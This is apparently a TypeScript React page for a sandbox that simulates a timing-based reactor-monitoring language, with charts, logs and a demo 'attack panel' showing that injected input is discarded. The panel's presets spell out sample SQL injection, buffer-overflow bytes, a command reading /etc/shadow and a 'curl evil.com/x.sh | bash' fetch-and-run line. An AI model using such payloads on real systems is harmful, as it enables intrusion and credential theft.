import React, { useState, useEffect, useRef, useCallback } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { lex }           from '../lib/tempus/lexer';
import { parse }         from '../lib/tempus/parser';
import { buildRuntime, createSimulator } from '../lib/tempus/runtime';
import type { SimEvent, CellDecl, ParsedProgram } from '../lib/tempus/types';

// ── Default program ───────────────────────────────────────────────────────────
const DEFAULT = `-- Nuclear coolant temperature monitor
sync coolant_sensor at 10.0e6 freq

cell NOMINAL  bounds (-1.0e-7, 1.0e-7)  action 0
cell WARM     bounds ( 1.0e-7, 5.0e-7)  action 1
cell HOT      bounds ( 5.0e-7, 2.0e-6)  action 2
cell CRITICAL bounds ( 2.0e-6, 1.0e-5)  action 3

compose d=1 channels coolant_sensor into coolant_traj

when NOMINAL  do emit status_ok
when WARM     do emit status_warn
when HOT      do begin
                 emit status_hot;
                 fire reduce_power(0.8)
               end
when CRITICAL do begin
                 emit scram_alert;
                 fire emergency_shutdown
               end`;

// ── Palette ───────────────────────────────────────────────────────────────────
const PALETTE = ['#58E6D9','#f59e0b','#f97316','#ef4444','#60a5fa','#a78bfa','#34d399','#fb923c'];
const ANOMALY = '#4b5563';

function cellPalette(names: string[]): Map<string, string> {
  const m = new Map<string, string>();
  names.forEach((n, i) => m.set(n, PALETTE[i % PALETTE.length]));
  m.set('anomaly', ANOMALY);
  return m;
}

function fmtDP(v: number): string {
  const a = Math.abs(v);
  if (a === 0) return '0';
  if (a < 1e-6) return `${(v * 1e9).toFixed(1)} ns`;
  if (a < 1e-3) return `${(v * 1e6).toFixed(2)} µs`;
  return `${(v * 1e3).toFixed(2)} ms`;
}

function nowStamp(): string {
  const d = new Date();
  return `${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}.${String(d.getMilliseconds()).padStart(3,'0')}`;
}

// ── Canvas helpers ────────────────────────────────────────────────────────────
function initCanvas(canvas: HTMLCanvasElement | null): [CanvasRenderingContext2D, number, number] | null {
  if (!canvas) return null;
  const W = canvas.width  = canvas.offsetWidth;
  const H = canvas.height = canvas.offsetHeight;
  if (W === 0 || H === 0) return null;
  const ctx = canvas.getContext('2d')!;
  ctx.fillStyle = '#070c09';
  ctx.fillRect(0, 0, W, H);
  return [ctx, W, H];
}

function chartTitle(ctx: CanvasRenderingContext2D, text: string, x: number, y: number) {
  ctx.fillStyle = 'rgba(255,255,255,0.25)';
  ctx.font = '9px monospace';
  ctx.textAlign = 'left';
  ctx.fillText(text, x, y);
}

function gridLines(ctx: CanvasRenderingContext2D, pl: number, pt: number, iW: number, iH: number, cols = 5, rows = 4) {
  ctx.strokeStyle = 'rgba(255,255,255,0.04)';
  ctx.lineWidth = 0.5;
  for (let i = 1; i < cols; i++) {
    const x = pl + (iW * i) / cols;
    ctx.beginPath(); ctx.moveTo(x, pt); ctx.lineTo(x, pt + iH); ctx.stroke();
  }
  for (let i = 1; i < rows; i++) {
    const y = pt + (iH * i) / rows;
    ctx.beginPath(); ctx.moveTo(pl, y); ctx.lineTo(pl + iW, y); ctx.stroke();
  }
}

// ── Chart 1: ΔP timeline scatter ─────────────────────────────────────────────
function drawDpScatter(
  canvas: HTMLCanvasElement | null,
  events: SimEvent[],
  cells:  Map<string, CellDecl>,
  colors: Map<string, string>
) {
  const r = initCanvas(canvas); if (!r) return;
  const [ctx, W, H] = r;
  const PAD = { l:54, r:10, t:14, b:26 };
  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
  const cellArr = Array.from(cells.values());
  const yMin = Math.min(...cellArr.map(c => c.lo));
  const yMax = Math.max(...cellArr.map(c => c.hi));
  const yRange = yMax - yMin || 1;
  const xS = (i: number) => PAD.l + (i / Math.max(events.length - 1, 1)) * iW;
  const yS = (v: number) => PAD.t + iH - ((v - yMin) / yRange) * iH;

  for (const [name, cell] of cells) {
    const col = colors.get(name) ?? '#888';
    const y1 = yS(cell.hi), y2 = yS(cell.lo);
    ctx.fillStyle = col + '14'; ctx.fillRect(PAD.l, y1, iW, y2 - y1);
    ctx.strokeStyle = col + '35'; ctx.lineWidth = 0.5;
    ctx.beginPath(); ctx.moveTo(PAD.l, y1); ctx.lineTo(PAD.l + iW, y1); ctx.stroke();
    ctx.fillStyle = col + '60'; ctx.font = '8px monospace'; ctx.textAlign = 'left';
    ctx.fillText(name, PAD.l + 3, (y1 + y2) / 2 + 3);
  }
  gridLines(ctx, PAD.l, PAD.t, iW, iH);
  for (const ev of events) {
    const col = colors.get(ev.cell) ?? ANOMALY;
    ctx.beginPath();
    ctx.arc(xS(ev.index), yS(ev.dp), ev.actionFired ? 3.5 : 1.8, 0, Math.PI * 2);
    ctx.fillStyle = ev.actionFired ? col : col + 'a0';
    ctx.fill();
  }
  ctx.fillStyle = 'rgba(255,255,255,0.35)'; ctx.font = '8px monospace'; ctx.textAlign = 'right';
  ctx.fillText(fmtDP(yMax), PAD.l - 3, PAD.t + 7);
  ctx.fillText(fmtDP(yMin), PAD.l - 3, PAD.t + iH + 1);
  chartTitle(ctx, 'ΔP  TIMELINE', PAD.l + 4, PAD.t + 10);
}

// ── Chart 2: cell frequency bars ─────────────────────────────────────────────
function drawCellBar(
  canvas: HTMLCanvasElement | null,
  events: SimEvent[],
  cells:  Map<string, CellDecl>,
  colors: Map<string, string>
) {
  const r = initCanvas(canvas); if (!r) return;
  const [ctx, W, H] = r;
  const PAD = { l:8, r:8, t:18, b:34 };
  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
  const names = [...Array.from(cells.keys()), 'anomaly'];
  const counts = new Map<string, number>();
  names.forEach(n => counts.set(n, 0));
  events.forEach(e => counts.set(e.cell, (counts.get(e.cell) ?? 0) + 1));
  const maxC = Math.max(...Array.from(counts.values()), 1);
  const bW = iW / names.length;
  gridLines(ctx, PAD.l, PAD.t, iW, iH, names.length, 4);
  names.forEach((name, i) => {
    const col = colors.get(name) ?? ANOMALY;
    const cnt = counts.get(name) ?? 0;
    const bH  = (cnt / maxC) * iH;
    const x   = PAD.l + i * bW;
    ctx.fillStyle = col + '20'; ctx.fillRect(x + 1, PAD.t, bW - 2, iH);
    ctx.fillStyle = col;       ctx.fillRect(x + 1, PAD.t + iH - bH, bW - 2, bH);
    ctx.fillStyle = col; ctx.font = '8px monospace'; ctx.textAlign = 'center';
    ctx.fillText(name.slice(0, 8), x + bW / 2, H - PAD.b + 12);
    if (cnt > 0) {
      ctx.fillStyle = 'rgba(255,255,255,0.65)';
      ctx.fillText(String(cnt), x + bW / 2, PAD.t + iH - bH - 3);
    }
  });
  chartTitle(ctx, 'CELL  FREQUENCY', PAD.l + 4, PAD.t - 5);
}

// ── Chart 3: phase strip (event-by-event COMPILE/EXECUTE timeline) ────────────
function drawPhaseStrip(
  canvas: HTMLCanvasElement | null,
  events: SimEvent[]
) {
  const r = initCanvas(canvas); if (!r) return;
  const [ctx, W, H] = r;
  const PAD = { l:8, r:8, t:18, b:18 };
  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
  const recent = events.slice(-500);
  if (recent.length === 0) { chartTitle(ctx, 'PHASE  TIMELINE', PAD.l + 4, PAD.t - 5); return; }
  const sqW = Math.max(1, iW / recent.length);
  recent.forEach((ev, i) => {
    const col = ev.phase === 'EXECUTE' ? '#f59e0b' : '#60a5fa';
    const alpha = ev.phase === 'EXECUTE' ? 'cc' : '60';
    ctx.fillStyle = col + alpha;
    ctx.fillRect(PAD.l + i * sqW, PAD.t, Math.max(1, sqW - 0.5), iH);
  });
  // legend
  ctx.font = '8px monospace';
  [['#60a5fa', 'COMPILE'], ['#f59e0b', 'EXECUTE']].forEach(([c, l], i) => {
    ctx.fillStyle = c + 'cc';
    ctx.fillRect(PAD.l + 4 + i * 70, H - 12, 8, 7);
    ctx.fillStyle = 'rgba(255,255,255,0.35)';
    ctx.textAlign = 'left';
    ctx.fillText(l, PAD.l + 14 + i * 70, H - 6);
  });
  chartTitle(ctx, 'PHASE  TIMELINE', PAD.l + 4, PAD.t - 5);
}

// ── Chart 4: channel activity (horizontal bars) ───────────────────────────────
function drawChannelBar(
  canvas:   HTMLCanvasElement | null,
  events:   SimEvent[],
  channels: string[]
) {
  const r = initCanvas(canvas); if (!r) return;
  const [ctx, W, H] = r;
  const PAD = { l:68, r:14, t:18, b:12 };
  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
  const counts = new Map<string, number>();
  channels.forEach(c => counts.set(c, 0));
  events.forEach(e => counts.set(e.channel, (counts.get(e.channel) ?? 0) + 1));
  const maxC = Math.max(...Array.from(counts.values()), 1);
  const rowH = iH / Math.max(channels.length, 1);
  channels.forEach((ch, i) => {
    const cnt  = counts.get(ch) ?? 0;
    const barW = (cnt / maxC) * iW;
    const y    = PAD.t + i * rowH + rowH * 0.12;
    const bH   = rowH * 0.76;
    ctx.fillStyle = PALETTE[i % PALETTE.length] + '20'; ctx.fillRect(PAD.l, y, iW, bH);
    ctx.fillStyle = PALETTE[i % PALETTE.length];        ctx.fillRect(PAD.l, y, barW, bH);
    ctx.fillStyle = 'rgba(255,255,255,0.5)'; ctx.font = '9px monospace'; ctx.textAlign = 'right';
    ctx.fillText(ch, PAD.l - 5, y + bH * 0.72);
    ctx.textAlign = 'left';
    if (cnt > 0) ctx.fillText(String(cnt), PAD.l + barW + 4, y + bH * 0.72);
  });
  chartTitle(ctx, 'CHANNEL  ACTIVITY', PAD.l + 4, PAD.t - 5);
}

// ── Chart 5: ΔP histogram (distribution) ─────────────────────────────────────
function drawDpHistogram(
  canvas: HTMLCanvasElement | null,
  events: SimEvent[],
  cells:  Map<string, CellDecl>,
  colors: Map<string, string>
) {
  const r = initCanvas(canvas); if (!r) return;
  const [ctx, W, H] = r;
  const PAD = { l:10, r:10, t:18, b:26 };
  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;
  if (events.length === 0) { chartTitle(ctx, 'ΔP  HISTOGRAM', PAD.l + 4, PAD.t - 5); return; }

  const cellArr = Array.from(cells.values());
  const xMin = Math.min(...cellArr.map(c => c.lo));
  const xMax = Math.max(...cellArr.map(c => c.hi));
  const range = xMax - xMin || 1;

  const BINS = 40;
  const binW = range / BINS;
  const counts = new Array(BINS).fill(0);
  events.forEach(ev => {
    const b = Math.floor((ev.dp - xMin) / binW);
    if (b >= 0 && b < BINS) counts[b]++;
  });
  const maxC = Math.max(...counts, 1);
  const pxW  = iW / BINS;
  const xS   = (v: number) => PAD.l + ((v - xMin) / range) * iW;
  const yS   = (c: number) => PAD.t + iH - (c / maxC) * iH;

  // cell band backgrounds
  for (const cell of cellArr) {
    const col = colors.get(cell.name) ?? '#888';
    ctx.fillStyle = col + '12';
    ctx.fillRect(xS(cell.lo), PAD.t, xS(cell.hi) - xS(cell.lo), iH);
  }

  // bars coloured by which cell each bin falls in
  for (let b = 0; b < BINS; b++) {
    if (counts[b] === 0) continue;
    const dp = xMin + (b + 0.5) * binW;
    let col = ANOMALY;
    for (const cell of cellArr) if (dp >= cell.lo && dp <= cell.hi) { col = colors.get(cell.name) ?? '#888'; break; }
    ctx.fillStyle = col + 'c0';
    ctx.fillRect(PAD.l + b * pxW, yS(counts[b]), Math.max(1, pxW - 0.5), iH - (yS(counts[b]) - PAD.t));
  }

  // x axis ticks
  ctx.fillStyle = 'rgba(255,255,255,0.28)'; ctx.font = '8px monospace';
  [xMin, (xMin + xMax) / 2, xMax].forEach(v => {
    ctx.textAlign = 'center';
    ctx.fillText(fmtDP(v), xS(v), H - 6);
    ctx.strokeStyle = 'rgba(255,255,255,0.08)'; ctx.lineWidth = 0.5;
    ctx.beginPath(); ctx.moveTo(xS(v), PAD.t); ctx.lineTo(xS(v), PAD.t + iH); ctx.stroke();
  });
  chartTitle(ctx, 'ΔP  HISTOGRAM', PAD.l + 4, PAD.t - 5);
}

// ── Chart 6: action dispatch rate (rolling line) ──────────────────────────────
function drawActionRate(
  canvas: HTMLCanvasElement | null,
  events: SimEvent[],
  colors: Map<string, string>
) {
  const r = initCanvas(canvas); if (!r) return;
  const [ctx, W, H] = r;
  const PAD = { l:36, r:10, t:18, b:24 };
  const iW = W - PAD.l - PAD.r, iH = H - PAD.t - PAD.b;

  // rolling window: count dispatches per 50-event window
  const WIN = 50;
  const pts: number[] = [];
  for (let i = 0; i < events.length; i++) {
    const lo = Math.max(0, i - WIN + 1);
    let cnt = 0;
    for (let j = lo; j <= i; j++) if (events[j].actionFired) cnt++;
    pts.push(cnt / Math.min(i + 1, WIN));
  }
  if (pts.length === 0) { chartTitle(ctx, 'ACTION  RATE', PAD.l + 4, PAD.t - 5); return; }

  const maxV = Math.max(...pts, 0.01);
  const xS = (i: number) => PAD.l + (i / Math.max(pts.length - 1, 1)) * iW;
  const yS = (v: number) => PAD.t + iH - (v / maxV) * iH;

  gridLines(ctx, PAD.l, PAD.t, iW, iH, 5, 4);

  // fill
  ctx.beginPath();
  ctx.moveTo(xS(0), yS(0));
  pts.forEach((v, i) => ctx.lineTo(xS(i), yS(v)));
  ctx.lineTo(xS(pts.length - 1), PAD.t + iH);
  ctx.lineTo(xS(0), PAD.t + iH);
  ctx.closePath();
  ctx.fillStyle = '#58E6D9' + '20';
  ctx.fill();

  // line
  ctx.beginPath();
  pts.forEach((v, i) => {
    if (i === 0) ctx.moveTo(xS(i), yS(v));
    else         ctx.lineTo(xS(i), yS(v));
  });
  ctx.strokeStyle = '#58E6D9'; ctx.lineWidth = 1.5; ctx.stroke();

  // y labels
  ctx.fillStyle = 'rgba(255,255,255,0.3)'; ctx.font = '8px monospace'; ctx.textAlign = 'right';
  ctx.fillText(maxV.toFixed(2), PAD.l - 3, PAD.t + 5);
  ctx.fillText('0', PAD.l - 3, PAD.t + iH + 1);
  chartTitle(ctx, 'ACTION  RATE  (rolling)', PAD.l + 4, PAD.t - 5);
}

// ── State strip ───────────────────────────────────────────────────────────────
function StateStrip({ phase, cycle, lastDP, activeCell, lastAction, colors }: {
  phase: string; cycle: number; lastDP: number | null;
  activeCell: string | null; lastAction: string | null;
  colors: Map<string, string>;
}) {
  const phaseCol  = phase === 'EXECUTE' ? '#f59e0b' : phase === 'COMPILE' ? '#60a5fa' : '#4b5563';
  const phaseGlow = phase === 'EXECUTE' ? 'rgba(245,158,11,0.16)' : 'transparent';
  const cellCol   = activeCell ? (colors.get(activeCell) ?? 'rgba(255,255,255,0.6)') : 'rgba(255,255,255,0.22)';

  const items: { k: string; node: React.ReactNode }[] = [
    {
      k: 'Phase σ',
      node: (
        <span style={{
          display:'inline-block', padding:'2px 8px',
          border:`1px solid ${phaseCol}`, color: phaseCol,
          fontSize:10, letterSpacing:'0.1em',
          background: phaseGlow,
          boxShadow: phase === 'EXECUTE' ? `0 0 10px ${phaseGlow}` : 'none',
        }}>{phase}</span>
      ),
    },
    { k: 'Cycle M',    node: <span style={{ color:'rgba(255,255,255,0.7)' }}>{cycle > 0 ? cycle.toLocaleString() : '—'}</span> },
    { k: 'ΔP(k)',      node: <span style={{ color:'rgba(255,255,255,0.7)' }}>{lastDP !== null ? fmtDP(lastDP) : '—'}</span> },
    { k: 'Cell',       node: <span style={{ color: cellCol, fontWeight:600 }}>{activeCell ?? '—'}</span> },
    { k: 'Last action',node: <span style={{ color:'rgba(255,255,255,0.42)', fontSize:10, whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', display:'block' }}>{lastAction ?? '—'}</span> },
  ];

  return (
    <div style={{
      display:'grid', gridTemplateColumns:'repeat(5, 1fr)',
      borderBottom:'1px solid rgba(255,255,255,0.07)',
      background:'#080e0b', flexShrink:0,
    }}>
      {items.map(({ k, node }, i) => (
        <div key={k} style={{
          padding:'8px 13px',
          borderRight: i < 4 ? '1px solid rgba(255,255,255,0.04)' : 'none',
        }}>
          <div style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.22)',
                        fontFamily:'monospace', textTransform:'uppercase', marginBottom:4 }}>
            {k}
          </div>
          <div style={{ fontSize:13, fontFamily:'monospace', fontWeight:500, lineHeight:1.2 }}>
            {node}
          </div>
        </div>
      ))}
    </div>
  );
}

// ── Cell registry (React) ─────────────────────────────────────────────────────
function CellRegistry({ cells, colors, whens, counts, activeCell }: {
  cells:      Map<string, CellDecl>;
  colors:     Map<string, string>;
  whens:      Map<string, string[]>;
  counts:     Map<string, number>;
  activeCell: string | null;
}) {
  return (
    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <div style={{ padding:'8px 10px 4px', fontSize:8, letterSpacing:'0.16em',
                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
        CELL  REGISTRY  Γ
      </div>
      <div style={{ flex:1, overflowY:'auto', padding:'0 7px 7px' }}>
        {Array.from(cells.values()).map(cell => {
          const col    = colors.get(cell.name) ?? '#888';
          const acts   = whens.get(cell.name) ?? [];
          const hits   = counts.get(cell.name) ?? 0;
          const active = cell.name === activeCell;
          return (
            <div key={cell.name} style={{
              padding:'6px 8px', marginBottom:3,
              border:`1px solid ${active ? col + 'aa' : 'rgba(255,255,255,0.05)'}`,
              background: active ? col + '10' : 'rgba(255,255,255,0.01)',
              boxShadow: active ? `0 0 12px ${col}25` : 'none',
              transition:'all 0.12s',
            }}>
              <div style={{ display:'flex', justifyContent:'space-between' }}>
                <span style={{ fontFamily:'monospace', fontSize:10, color: active ? col : col + 'bb',
                               fontWeight: active ? 700 : 400 }}>
                  {cell.name}
                </span>
                <span style={{ fontFamily:'monospace', fontSize:10, color:'rgba(255,255,255,0.2)' }}>
                  {hits}
                </span>
              </div>
              <div style={{ fontFamily:'monospace', fontSize:8, color:'rgba(255,255,255,0.25)', marginTop:2 }}>
                [{fmtDP(cell.lo)}, {fmtDP(cell.hi)}]
              </div>
              {acts.length > 0 && (
                <div style={{ fontFamily:'monospace', fontSize:8, marginTop:2,
                              color: active ? col + 'c0' : 'rgba(255,255,255,0.16)',
                              fontStyle:'italic', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                  {acts[0]}
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── Action log (React) ────────────────────────────────────────────────────────
interface ActionEntry { ts: string; cell: string; action: string; dp: number; color: string; }

function ActionLog({ entries }: { entries: ActionEntry[] }) {
  return (
    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <div style={{ padding:'8px 10px 4px', fontSize:8, letterSpacing:'0.16em',
                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
        ACTION  LOG
      </div>
      {entries.length === 0 ? (
        <div style={{ flex:1, display:'flex', alignItems:'center', justifyContent:'center',
                      fontSize:9, color:'rgba(255,255,255,0.1)', fontStyle:'italic', fontFamily:'monospace' }}>
          no dispatches yet
        </div>
      ) : (
        <div style={{ flex:1, overflowY:'auto' }}>
          {entries.map((e, i) => (
            <div key={i} style={{
              display:'grid', gridTemplateColumns:'50px 1fr 54px',
              gap:'0 6px', padding:'3px 9px',
              borderBottom:'1px solid rgba(255,255,255,0.03)',
              fontSize:9, fontFamily:'monospace',
            }}>
              <span style={{ color:'rgba(255,255,255,0.2)' }}>{e.ts}</span>
              <div style={{ minWidth:0 }}>
                <span style={{ color: e.color, fontWeight:600 }}>{e.cell}</span>
                <span style={{ color:'rgba(255,255,255,0.33)', marginLeft:5,
                               overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap',
                               display:'inline-block', maxWidth:'calc(100% - 68px)', verticalAlign:'bottom' }}>
                  {e.action}
                </span>
              </div>
              <span style={{ color:'rgba(255,255,255,0.2)', textAlign:'right', fontSize:8 }}>
                {fmtDP(e.dp)}
              </span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ── Attack panel ──────────────────────────────────────────────────────────────
const ATTACK_PRESETS: Record<string, string> = {
  SQL:  `'; DROP TABLE reactor_logs; --\nUNION SELECT password FROM admin_users WHERE '1'='1`,
  BOF:  `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\\x90\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76`,
  CMD:  `; cat /etc/shadow\n|| curl evil.com/x.sh | bash`,
  JSON: `{"op":"emergency_shutdown","authorized":true,"by":"admin"}\n{"cell":"CRITICAL","force_dispatch":true}`,
};

interface AttackEntry { ts: string; bytes: number; }

function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
  const [payload, setPayload] = useState(`'; DROP TABLE reactor_logs; --\n\nAAAAAAAAAAAA\\x90\\x90\\x90\\xeb\\x1f\n\n{"op":"emergency_shutdown","authorized":true}`);
  const [log,   setLog]   = useState<AttackEntry[]>([]);
  const [stats, setStats] = useState({ injections: 0, bytes: 0 });

  const inject = useCallback((text: string) => {
    setLog(p => [{ ts: nowStamp(), bytes: text.length }, ...p].slice(0, 60));
    setStats(s => ({ injections: s.injections + 1, bytes: s.bytes + text.length }));
  }, []);

  const flood = useCallback(() => {
    for (let i = 0; i < 100; i++) setTimeout(() => inject(payload + `\n#${i}`), i * 8);
  }, [payload, inject]);

  return (
    <div style={{ display:'flex', flexDirection:'column', height:'100%', overflow:'hidden' }}>
      <div style={{ padding:'10px 13px', background:'#0a1209',
                    borderBottom:'1px solid rgba(255,255,255,0.05)',
                    fontSize:10, fontFamily:'monospace', color:'rgba(255,255,255,0.32)', lineHeight:1.55 }}>
        A temporal system has <span style={{ color:'#58E6D9' }}>no content parser</span>. The only datum a pulse contributes is{' '}
        <em style={{ color:'rgba(255,255,255,0.6)' }}>when it arrived</em>. Inject anything —
        the action set stays bounded by the compiled cell registry.{' '}
        <span style={{ color:'rgba(255,255,255,0.18)' }}>Thm. 6.1</span>
      </div>
      <div style={{ padding:'10px 11px', borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
        <textarea value={payload} onChange={e => setPayload(e.target.value)} spellCheck={false}
          style={{ width:'100%', background:'#0c0808', color:'#ef4444', fontFamily:'monospace',
                   fontSize:11, lineHeight:1.55, padding:'9px', border:'1px solid rgba(239,68,68,0.2)',
                   resize:'vertical', minHeight:72, outline:'none', boxSizing:'border-box' }} />
        <div style={{ display:'flex', gap:5, flexWrap:'wrap', marginTop:6 }}>
          {Object.entries(ATTACK_PRESETS).map(([k, v]) => (
            <button key={k} onClick={() => setPayload(v)}
              style={{ fontFamily:'monospace', fontSize:9, padding:'3px 7px',
                       border:'1px solid rgba(255,255,255,0.1)', background:'transparent',
                       color:'rgba(255,255,255,0.32)', cursor:'pointer' }}>{k}</button>
          ))}
        </div>
        <div style={{ display:'flex', gap:6, marginTop:7 }}>
          <button onClick={() => inject(payload)}
            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 13px',
                     background:'rgba(239,68,68,0.1)', color:'#ef4444',
                     border:'1px solid rgba(239,68,68,0.35)', cursor:'pointer' }}>INJECT</button>
          <button onClick={flood}
            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 13px',
                     background:'transparent', color:'rgba(255,255,255,0.28)',
                     border:'1px solid rgba(255,255,255,0.1)', cursor:'pointer' }}>FLOOD ×100</button>
          <button onClick={() => { setLog([]); setStats({ injections: 0, bytes: 0 }); }}
            style={{ fontFamily:'monospace', fontSize:10, padding:'5px 13px', marginLeft:'auto',
                     background:'transparent', color:'rgba(255,255,255,0.18)',
                     border:'1px solid rgba(255,255,255,0.07)', cursor:'pointer' }}>RESET</button>
        </div>
      </div>
      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr 1fr',
                    borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
        {[['INJECTED', String(stats.injections), undefined],
          ['BYTES', stats.bytes.toLocaleString(), undefined],
          ['PARSERS', '0', '#34d399'],
          ['|Cells(A)|', String(cells.size), '#58E6D9']
        ].map(([k, v, c]) => (
          <div key={k as string} style={{ padding:'8px 6px', textAlign:'center',
                                          borderRight:'1px solid rgba(255,255,255,0.04)' }}>
            <div style={{ fontSize:7, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)', fontFamily:'monospace' }}>{k}</div>
            <div style={{ fontSize:15, color:(c ?? 'rgba(255,255,255,0.6)') as string,
                          fontFamily:'monospace', fontWeight:700, marginTop:2 }}>{v}</div>
          </div>
        ))}
      </div>
      <div style={{ flex:1, overflowY:'auto' }}>
        {log.length === 0 ? (
          <div style={{ textAlign:'center', padding:'20px', fontFamily:'monospace', fontSize:9,
                        color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>no injections yet</div>
        ) : log.map((e, i) => (
          <div key={i} style={{ display:'grid', gridTemplateColumns:'50px 40px 1fr',
                                gap:'0 7px', padding:'3px 11px',
                                borderBottom:'1px solid rgba(255,255,255,0.03)',
                                fontSize:9, fontFamily:'monospace' }}>
            <span style={{ color:'rgba(255,255,255,0.2)' }}>{e.ts}</span>
            <span style={{ color:'rgba(239,68,68,0.5)' }}>{e.bytes}B</span>
            <span style={{ color:'rgba(255,255,255,0.16)', fontStyle:'italic' }}>discarded · no parser</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Page ─────────────────────────────────────────────────────────────────────
interface Stats { total: number; dispatched: number; anomalies: number; done: boolean; }
interface LiveState { phase: string; cycle: number; lastDP: number | null; activeCell: string | null; lastAction: string | null; }

// canvas ref bundle
type Canvases = {
  dp:    React.RefObject<HTMLCanvasElement>;
  cell:  React.RefObject<HTMLCanvasElement>;
  phase: React.RefObject<HTMLCanvasElement>;
  chan:  React.RefObject<HTMLCanvasElement>;
  hist:  React.RefObject<HTMLCanvasElement>;
  rate:  React.RefObject<HTMLCanvasElement>;
};

function TempusSandbox() {
  const [code,       setCode]       = useState(DEFAULT);
  const [nEvents,    setNEvents]    = useState(600);
  const [noise,      setNoise]      = useState(0.35);
  const [speed,      setSpeed]      = useState(200);
  const [error,      setError]      = useState<string | null>(null);
  const [running,    setRunning]    = useState(false);
  const [leftTab,    setLeftTab]    = useState<'program' | 'attack'>('program');
  const [stats,      setStats]      = useState<Stats>({ total:0, dispatched:0, anomalies:0, done:false });
  const [liveState,  setLiveState]  = useState<LiveState>({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
  const [actionLog,  setActionLog]  = useState<ActionEntry[]>([]);
  const [parsedProg, setParsedProg] = useState<ParsedProgram | null>(null);
  const [colors,     setColors]     = useState<Map<string, string>>(new Map());
  const [cellCounts, setCellCounts] = useState<Map<string, number>>(new Map());
  const [channels,   setChannels]   = useState<string[]>([]);

  const simRef      = useRef<ReturnType<typeof createSimulator> | null>(null);
  const colorsRef   = useRef<Map<string, string>>(new Map());
  const channelsRef = useRef<string[]>([]);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const cvs: Canvases = {
    dp:    useRef<HTMLCanvasElement>(null),
    cell:  useRef<HTMLCanvasElement>(null),
    phase: useRef<HTMLCanvasElement>(null),
    chan:  useRef<HTMLCanvasElement>(null),
    hist:  useRef<HTMLCanvasElement>(null),
    rate:  useRef<HTMLCanvasElement>(null),
  };

  const redrawAll = useCallback(() => {
    if (!simRef.current) return;
    const evs  = simRef.current.getEvents();
    const cels = simRef.current.getCells();
    drawDpScatter  (cvs.dp.current,    evs, cels, colorsRef.current);
    drawCellBar    (cvs.cell.current,  evs, cels, colorsRef.current);
    drawPhaseStrip (cvs.phase.current, evs);
    drawChannelBar (cvs.chan.current,  evs, channelsRef.current);
    drawDpHistogram(cvs.hist.current,  evs, cels, colorsRef.current);
    drawActionRate (cvs.rate.current,  evs, colorsRef.current);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const handleRun = useCallback(() => {
    try {
      setError(null);
      const prog       = buildRuntime(parse(lex(code)));
      const newColors  = cellPalette(Array.from(prog.cells.keys()));
      const newChans   = prog.compose?.channels ?? Array.from(prog.syncs.keys());
      colorsRef.current   = newColors;
      channelsRef.current = newChans;
      setColors(newColors);
      setChannels(newChans);
      setParsedProg(prog);
      setActionLog([]);
      setCellCounts(new Map());
      setLiveState({ phase:'COMPILE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
      const batchSize = Math.max(1, Math.floor(speed / 20));
      simRef.current  = createSimulator(prog, { totalEvents: nEvents, noiseSigma: noise, seed: 42, batchSize });
      setRunning(true);
    } catch (e: any) { setError(String(e.message)); }
  }, [code, nEvents, noise, speed]);

  const handleStop = useCallback(() => {
    if (intervalRef.current) clearInterval(intervalRef.current);
    setRunning(false);
    setLiveState(s => ({ ...s, phase:'IDLE' }));
  }, []);

  const handleReset = useCallback(() => {
    handleStop();
    simRef.current?.reset();
    setActionLog([]);
    setCellCounts(new Map());
    setStats({ total:0, dispatched:0, anomalies:0, done:false });
    setLiveState({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
    Object.values(cvs).forEach(ref => {
      const c = ref.current;
      if (c) { const ctx = c.getContext('2d'); ctx?.clearRect(0, 0, c.width, c.height); }
    });
  }, [handleStop]); // eslint-disable-line react-hooks/exhaustive-deps

  // simulation loop
  useEffect(() => {
    if (!running) return;
    intervalRef.current = setInterval(() => {
      if (!simRef.current || simRef.current.isDone()) {
        setRunning(false);
        setLiveState(s => ({ ...s, phase:'IDLE' }));
        return;
      }
      const batch = simRef.current.generateBatch();
      const last  = batch[batch.length - 1];
      if (last) setLiveState({ phase: last.phase, cycle: last.M, lastDP: last.dp, activeCell: last.cell, lastAction: last.actionFired });

      const completions = batch.filter(e => e.actionFired !== null);
      if (completions.length > 0) {
        const newEntries: ActionEntry[] = completions.map(e => ({
          ts: nowStamp(), cell: e.cell, action: e.actionFired!,
          dp: e.dp, color: colorsRef.current.get(e.cell) ?? ANOMALY,
        }));
        setActionLog(p => [...newEntries, ...p].slice(0, 80));
      }

